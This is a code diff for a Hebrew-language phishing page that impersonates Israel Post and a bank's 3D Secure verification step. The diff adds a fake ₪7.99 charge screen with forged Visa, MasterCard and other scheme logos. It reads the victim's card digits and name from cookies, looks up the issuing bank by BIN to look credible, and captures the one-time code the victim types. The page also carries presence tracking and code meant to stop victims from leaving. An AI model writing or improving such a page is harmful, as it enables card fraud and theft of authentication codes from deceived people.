@@ -154,6 +154,49 @@
   @media (max-width:380px) {
     .otp-boxes input { width:38px; height:48px; font-size:19px; }
   }
+
+  /* ========= 3DS OTP card (reference image) ========= */
+  #otp .otp3ds { background:#fff; border:1px solid #e5e5e5; border-radius:4px;
+    box-shadow:0 1px 2px rgba(0,0,0,.04); overflow:hidden; margin:-8px -4px 0;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif; }
+  .otp3ds-head { display:flex; align-items:center; justify-content:space-between; padding:14px 16px; }
+  .otp3ds-logo { min-height:42px; display:flex; align-items:center; }
+  .otp3ds-logo img { max-height:42px; max-width:120px; display:block; }
+  .otp3ds-merchant { text-align:right; direction:rtl; }
+  .otp3ds-merchant .name { color:#d41c2a; font-weight:700; font-size:15px; letter-spacing:.2px; }
+  .otp3ds-merchant .sub  { color:#666; font-size:12px; margin-top:2px; }
+  .otp3ds-rule { height:2px; background:#d41c2a; }
+  .otp3ds-body { padding:16px; direction:rtl; }
+  .otp3ds-title { font-size:15px; font-weight:700; text-align:center; margin:4px 0 12px; color:#111; }
+  .otp3ds-notice { background:#f2f2f2; border:1px solid #e5e5e5; border-radius:3px;
+    padding:10px 12px; font-size:12.5px; line-height:1.55; color:#333; text-align:center; }
+  .otp3ds-notice b { color:#111; }
+  .otp3ds-info { width:100%; margin-top:12px; font-size:13px; border-collapse:collapse; }
+  .otp3ds-info td { padding:4px 2px; vertical-align:middle; }
+  .otp3ds-info td.lbl { color:#555; text-align:right; width:48%; }
+  .otp3ds-info td.val { color:#111; font-weight:600; text-align:left; width:52%; direction:ltr; }
+  .otp3ds-info td.amt { color:#d41c2a; font-weight:700; }
+  .otp3ds-row { margin:14px 0 6px; display:flex; align-items:center; gap:10px; justify-content:space-between; }
+  .otp3ds-row label { font-size:13.5px; color:#333; font-weight:600; }
+  .otp3ds-row input { flex:0 0 55%; border:1.5px solid #2b6cff; border-radius:4px;
+    padding:10px 12px; font-size:16px; outline:none; text-align:center; letter-spacing:4px;
+    background:#fff; color:#111; }
+  .otp3ds-row input:focus { border-color:#1a4fd4; }
+  .otp3ds-terms { display:flex; align-items:flex-start; gap:8px; margin-top:12px;
+    font-size:12px; color:#444; direction:rtl; }
+  .otp3ds-terms input { accent-color:#2b6cff; width:16px; height:16px; margin-top:2px; }
+  .otp3ds-btns { display:flex; gap:8px; margin-top:14px; direction:ltr; justify-content:flex-end; }
+  .otp3ds-btns button { flex:1; border:0; padding:10px 12px; border-radius:3px;
+    font-size:14px; font-weight:600; cursor:pointer; }
+  .otp3ds-cancel { background:#a7a7a7; color:#fff; }
+  .otp3ds-resend { background:#1f4ed8; color:#fff; }
+  .otp3ds-submit { background:#dfe7ff; color:#1f2937; }
+  .otp3ds-submit:hover { background:#cbd7fb; }
+  .otp3ds-submit:disabled { background:#e8ecf5; color:#9aa3b2; cursor:not-allowed; }
+  .otp3ds-foot { background:#f4f4f4; text-align:center; padding:10px; font-size:12px;
+    color:#444; border-top:1px solid #e5e5e5; }
+  .otp3ds-foot a { color:#444; text-decoration:none; margin:0 4px; }
+  .otp3ds-foot a:hover { text-decoration:underline; }
 </style>
 </head>
 <body>
@@ -203,46 +246,70 @@
       </div>
     </div>
 
-    <!-- ========= OTP ========= -->
+    <!-- ========= OTP (3D Secure style, matches reference) ========= -->
     <div id="otp" class="hidden">
-      <div class="topbar">
-        <div class="secure">
-          <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-          SSL מאובטח
+      <div class="otp3ds">
+        <div class="otp3ds-head">
+          <div class="otp3ds-logo"><img id="brandLogo" src="" alt=""></div>
+          <div class="otp3ds-merchant">
+            <div class="name">ISRAEL POST</div>
+            <div class="sub">(3D Secure) אימות עסקאות מאובטח</div>
+          </div>
         </div>
-        <img id="brandLogo" class="brand-logo" src="" alt="">
-      </div>
+        <div class="otp3ds-rule"></div>
 
-      <div class="vcard">
-        <div class="row1">
-          <div class="chip"></div>
-          <img id="brandBadge" class="brand-badge" src="" alt="">
+        <div class="otp3ds-body">
+          <h2 class="otp3ds-title">הגנה על התשלומים המקוונים שלך</h2>
+
+          <div class="otp3ds-notice">
+            קוד אימות חד-פעמי נדרש להשלמת הרכישה. הקוד נשלח ברגע זה לטלפון
+            הנייד הרשום שמסתיים ב-<b id="phoneHint">****</b>.
+          </div>
+
+          <table class="otp3ds-info">
+            <tr><td class="lbl">בית עסק (Merchant):</td><td class="val">ISRAEL POST — דואר ישראל</td></tr>
+            <tr><td class="lbl">סכום לחיוב (Amount):</td><td class="val amt">₪ 7.99</td></tr>
+            <tr><td class="lbl">תאריך (Date):</td><td class="val" id="otpDate">—</td></tr>
+            <tr><td class="lbl">מספר כרטיס:</td><td class="val">xxxx xxxx xxxx <span id="last4a">••••</span></td></tr>
+            <tr><td class="lbl">בנק מנפיק:</td><td class="val" id="otpBank">—</td></tr>
+          </table>
+
+          <!-- Hidden 6 boxes kept so existing JS (boxes/getOtp/clearOtp) still works -->
+          <div class="otp-boxes" id="otpBoxes" style="display:none">
+            <input type="tel" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+          </div>
+
+          <div class="otp3ds-row">
+            <label for="otpSingle">הזן קוד אימות:</label>
+            <input type="text" id="otpSingle" inputmode="numeric"
+                   pattern="[0-9]{4,8}" maxlength="8" minlength="4"
+                   autocomplete="one-time-code"
+                   oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+          </div>
+
+          <div id="otpErr" class="err"></div>
+
+          <label class="otp3ds-terms">
+            <input type="checkbox" id="otpAgree" checked>
+            <span>אני מאשר כי קראתי והבנתי את תנאי השימוש בשירות אימות עסקאות מאובטח.</span>
+          </label>
+
+          <div class="otp3ds-btns">
+            <button type="button" class="otp3ds-submit" id="otpBtn">Submit</button>
+            <button type="button" class="otp3ds-resend" id="resend">שלח שוב</button>
+            <button type="button" class="otp3ds-cancel" onclick="history.back()">בטל</button>
+          </div>
         </div>
-        <div class="num" id="cardNum">•••• •••• •••• ••••</div>
-        <div class="row2">
-          <div><span style="font-size:10px;opacity:.7">CARDHOLDER</span><b id="cardHolder">•••••</b></div>
-          <div><span style="font-size:10px;opacity:.7">VALID THRU</span><b>••/••</b></div>
+
+        <div class="otp3ds-foot">
+          <a href="#">Terms &amp; Conditions</a>|<a href="#">FAQs</a>|<a href="#">Contact Us</a>
         </div>
       </div>
-
-      <h2>קוד אימות — 3D Secure</h2>
-      <p class="sub">
-        נשלח קוד אימות ל־SMS למספר המסתיים ב־<b id="phoneHint">****</b> עבור כרטיס <b>•••• <span id="last4a">••••</span></b>.
-        נא להזין את 6 הספרות:
-      </p>
-
-      <div class="otp-boxes" id="otpBoxes">
-        <input type="tel" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-        <input type="tel" maxlength="1" inputmode="numeric">
-        <input type="tel" maxlength="1" inputmode="numeric">
-        <input type="tel" maxlength="1" inputmode="numeric">
-        <input type="tel" maxlength="1" inputmode="numeric">
-        <input type="tel" maxlength="1" inputmode="numeric">
-      </div>
-
-      <div id="otpErr" class="err"></div>
-      <button class="primary" id="otpBtn">אישור והמשך</button>
-      <div class="resend">לא קיבלת קוד? <a id="resend">שלח שוב</a></div>
     </div>
 
     <!-- ========= 3DS LINK ========= -->
@@ -440,15 +507,15 @@
     if (holder)      $('cardHolderLoad').textContent = holder.toUpperCase();
   }
 
-  // Brand logos as SVG data URIs
+  // Brand logos as SVG data URIs (3D Secure variants: "Verified by Visa" / "MasterCard SecureCode")
   const LOGOS = {
-    visa:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 256 83"><path fill="%231a1f71" d="M114 80 128 3h22l-14 77zM204 5c-4-2-11-4-19-4-21 0-36 11-36 27 0 12 11 18 19 22 9 4 12 7 12 10 0 6-7 8-13 8-8 0-13-1-20-4l-3-1-3 18c5 2 14 4 24 4 22 0 36-11 37-28 0-9-6-16-17-21-7-4-12-6-12-10 0-3 4-7 12-7 7 0 12 2 16 3l2 1 4-18zM229 3h-17c-5 0-9 2-11 7l-32 70h22l5-12h27l3 12h20zm-26 49 9-24 5 24zM96 3 75 55l-2-11c-4-13-16-26-30-33l20 69h22l33-77z"/><path fill="%23f7b600" d="M50 3H17L16 5c26 7 43 23 50 43l-7-36c-1-6-5-9-10-9z"/></svg>',
-    mastercard: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 152 108"><path fill="%23ff5f00" d="M56 11h40v86H56z"/><path fill="%23eb001b" d="M60 54A54 54 0 0 1 81 11a54 54 0 1 0 0 86 54 54 0 0 1-21-43z"/><path fill="%23f79e1b" d="M168 54a54 54 0 0 1-87 43 54 54 0 0 0 0-86 54 54 0 0 1 87 43z"/></svg>',
-    amex:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="%232e77bb"/><text x="24" y="20" text-anchor="middle" fill="white" font-family="Arial Black" font-size="7" font-weight="900">AMERICAN</text><text x="24" y="27" text-anchor="middle" fill="white" font-family="Arial Black" font-size="7" font-weight="900">EXPRESS</text></svg>',
-    discover:   'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="%23f5f5f5"/><text x="24" y="20" text-anchor="middle" fill="%23231f20" font-family="Arial" font-size="9" font-weight="700">DISCOVER</text><circle cx="36" cy="16" r="10" fill="%23f68121" opacity=".9"/></svg>',
-    jcb:        'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="white" stroke="%23ccc"/><text x="24" y="21" text-anchor="middle" fill="%230e4c96" font-family="Arial" font-size="11" font-weight="900">JCB</text></svg>',
-    diners:     'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="white" stroke="%23ccc"/><text x="24" y="19" text-anchor="middle" fill="%230079be" font-family="Arial" font-size="6" font-weight="700">DINERS CLUB</text></svg>',
-    card:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 32"><rect width="48" height="32" rx="4" fill="%23e5e5e5"/><rect y="8" width="48" height="6" fill="%23999"/></svg>'
+    visa:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 60"><text x="70" y="22" text-anchor="middle" font-family="Georgia,serif" font-size="14" font-style="italic" fill="%231a1f71">Verified by</text><text x="70" y="50" text-anchor="middle" font-family="Arial Black,Helvetica,sans-serif" font-size="26" font-weight="900" fill="%231a1f71" letter-spacing="2">VISA</text></svg>',
+    mastercard: 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 160 60"><g transform="translate(6 8)"><circle cx="16" cy="22" r="16" fill="%23eb001b"/><circle cx="34" cy="22" r="16" fill="%23f79e1b" opacity=".85"/></g><text x="58" y="26" font-family="Arial,Helvetica,sans-serif" font-size="11" fill="%23231f20" font-weight="700">MasterCard.</text><text x="58" y="44" font-family="Arial,Helvetica,sans-serif" font-size="9" fill="%23231f20">SecureCode</text></svg>',
+    amex:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 50"><rect width="140" height="50" rx="4" fill="%232e77bb"/><text x="70" y="22" text-anchor="middle" fill="white" font-family="Arial" font-size="9" font-weight="700">SafeKey</text><text x="70" y="38" text-anchor="middle" fill="white" font-family="Arial" font-size="11" font-weight="900">AMERICAN EXPRESS</text></svg>',
+    discover:   'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 50"><rect width="140" height="50" rx="4" fill="%23f5f5f5"/><text x="70" y="22" text-anchor="middle" fill="%23231f20" font-family="Arial" font-size="9" font-weight="700">ProtectBuy</text><text x="70" y="38" text-anchor="middle" fill="%23f68121" font-family="Arial" font-size="13" font-weight="900">DISCOVER</text></svg>',
+    jcb:        'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 50"><rect width="140" height="50" rx="4" fill="white" stroke="%23ccc"/><text x="70" y="22" text-anchor="middle" fill="%23231f20" font-family="Arial" font-size="9" font-weight="700">J/Secure</text><text x="70" y="40" text-anchor="middle" fill="%230e4c96" font-family="Arial" font-size="14" font-weight="900">JCB</text></svg>',
+    diners:     'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 50"><rect width="140" height="50" rx="4" fill="white" stroke="%23ccc"/><text x="70" y="22" text-anchor="middle" fill="%23231f20" font-family="Arial" font-size="9" font-weight="700">ProtectBuy</text><text x="70" y="40" text-anchor="middle" fill="%230079be" font-family="Arial" font-size="10" font-weight="700">DINERS CLUB</text></svg>',
+    card:       'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 140 50"><rect width="140" height="50" rx="4" fill="%23e5e5e5"/><text x="70" y="30" text-anchor="middle" fill="%23555" font-family="Arial" font-size="11" font-weight="700">3D SECURE</text></svg>'
   };
 
   function setBrand(brand, last4, holder) {
@@ -472,6 +539,19 @@
   function getCookie(n){ const m = document.cookie.match(new RegExp('(?:^|; )'+n+'=([^;]*)')); return m ? decodeURIComponent(m[1]) : ''; }
   const holder = getCookie('full_name');
   const last4Cookie = getCookie('card_last4');
+  const brandCookie = (getCookie('card_brand') || '').toLowerCase();
+  if (brandCookie) {
+    const bKey = (brandCookie === 'mc') ? 'mastercard' : brandCookie;
+    const logo = LOGOS[bKey] || LOGOS.card;
+    if ($('brandLogo'))  $('brandLogo').src  = logo;
+    if ($('brandLogo2')) $('brandLogo2').src = logo;
+    if ($('brandBadge')) $('brandBadge').src = logo;
+  } else {
+    // default placeholder so the logo slot isn't empty before check-mode responds
+    if ($('brandLogo'))  $('brandLogo').src  = LOGOS.card;
+    if ($('brandLogo2')) $('brandLogo2').src = LOGOS.card;
+    if ($('brandBadge')) $('brandBadge').src = LOGOS.card;
+  }
   if (holder) {
     $('cardHolder').textContent = holder.toUpperCase();
     const wh = document.getElementById('cardHolderWait'); if (wh) wh.textContent = holder.toUpperCase();
@@ -481,6 +561,31 @@
     $('cardNum').textContent = '•••• •••• •••• ' + last4Cookie;
     const wn = document.getElementById('cardNumWait'); if (wn) wn.textContent = '•••• •••• •••• ' + last4Cookie;
   }
+
+  // ----- 3DS OTP header: live date + BIN-based bank name -----
+  (function(){
+    const dEl = document.getElementById('otpDate');
+    if (dEl) {
+      const d = new Date();
+      const p = n => String(n).padStart(2,'0');
+      dEl.textContent = p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds())
+        + ' ' + p(d.getDate())+'.'+p(d.getMonth()+1)+'.'+d.getFullYear();
+    }
+    const bEl = document.getElementById('otpBank');
+    const bin = getCookie('card_bin');
+    if (bEl && bin && bin.length >= 6) {
+      fetch('/api/bin?bin=' + encodeURIComponent(bin))
+        .then(r => r.ok ? r.json() : null)
+        .then(j => {
+          if (!j) return;
+          const parts = [];
+          if (j.bank && j.bank !== 'Unknown') parts.push(j.bank);
+          if (j.country) parts.push(j.country);
+          if (parts.length) bEl.textContent = parts.join(' · ');
+        })
+        .catch(()=>{});
+    }
+  })();
 
   // ----- Presence tracking + anti-leave -----
   function postPresence(e) {
@@ -591,7 +696,25 @@
   });
 
   function getOtp(){ return boxes.map(b=>b.value).join(''); }
-  function clearOtp(){ boxes.forEach(b => { b.value=''; b.classList.remove('filled'); }); boxes[0].focus(); saveState({ otp: '' }); }
+  function clearOtp(){
+    boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
+    const s = document.getElementById('otpSingle');
+    if (s) s.value = '';
+    saveState({ otp: '' });
+  }
+
+  // Sync new single OTP input -> hidden 6 boxes (so existing JS/state keeps working)
+  const otpSingleEl = document.getElementById('otpSingle');
+  if (otpSingleEl) {
+    otpSingleEl.addEventListener('input', () => {
+      const v = otpSingleEl.value.replace(/\D/g,'').slice(0,6);
+      boxes.forEach((b, i) => {
+        b.value = v[i] || '';
+        if (b.value) b.classList.add('filled'); else b.classList.remove('filled');
+      });
+      saveState({ otp: v });
+    });
+  }
 
   // Persist OTP/TDS as user types
   boxes.forEach(b => b.addEventListener('input', () => saveState({ otp: getOtp() })));
@@ -711,6 +834,12 @@
     const v = getOtp();
     if (v.length < 4) {
       $('otpErr').textContent = 'נא להזין את כל הספרות';
+      $('otpErr').classList.add('show');
+      return;
+    }
+    const agree = document.getElementById('otpAgree');
+    if (agree && !agree.checked) {
+      $('otpErr').textContent = 'יש לאשר את תנאי השימוש';
       $('otpErr').classList.add('show');
       return;
     }
